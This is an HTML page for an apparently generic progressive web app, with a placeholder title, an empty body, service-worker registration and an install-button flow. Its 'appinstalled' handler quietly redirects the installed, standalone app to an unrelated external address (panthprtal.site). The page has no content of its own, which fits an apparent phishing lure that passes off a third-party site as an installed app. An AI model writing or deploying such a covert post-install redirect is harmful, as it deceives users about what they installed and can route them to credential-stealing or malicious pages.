<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="manifest" href="/public/manifest.json">
  <title>Your PWA Title</title>
</head>
<body>
  <button id="installButton" style="display: none;">Install PWA</button>

  <div id="root"></div>

  <script>
  if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('/sw.js')
  .then(registration => {
    console.log('Service Worker registered with scope:', registration.scope);
  })
  .catch(error => {
    console.error('Service Worker registration failed:', error);
  });
  }
</script>

<script>

  function canInstall() {
    return ('beforeinstallprompt' in window);
  }

  function isValidContent() {
    const rootElement = document.body;
    return rootElement && rootElement.innerText.trim() !== '';
  }

  function showInstallPrompt() {
      const installButton = document.getElementById('installButton');
      installButton.style.display = 'block';

  console.log('canInstall:', canInstall());

      if (canInstall()) {
        installButton.style.display = 'block';

        installButton.addEventListener('click', () => {
          const deferredPrompt = window.deferredPrompt;
          if (deferredPrompt) {
            deferredPrompt.prompt();
            deferredPrompt.userChoice
              .then((choiceResult) => {
                if (choiceResult.outcome === 'accepted') {
                  console.log('User accepted the install prompt');
                } else {
                  console.log('User dismissed the install prompt');
                }
                window.deferredPrompt = null;
              });
          }
        });
      }
    }
    window.addEventListener('beforeinstallprompt', (event) => {
      showInstallPrompt();
      event.preventDefault();
      window.deferredPrompt = event;
});


window.addEventListener('appinstalled', (event) => {
      if (window.matchMedia('(display-mode: standalone)').matches) {
        window.location.href = 'https://panthprtal.site/pvdTTs';
      }
    });

</script>

</body>
</html>
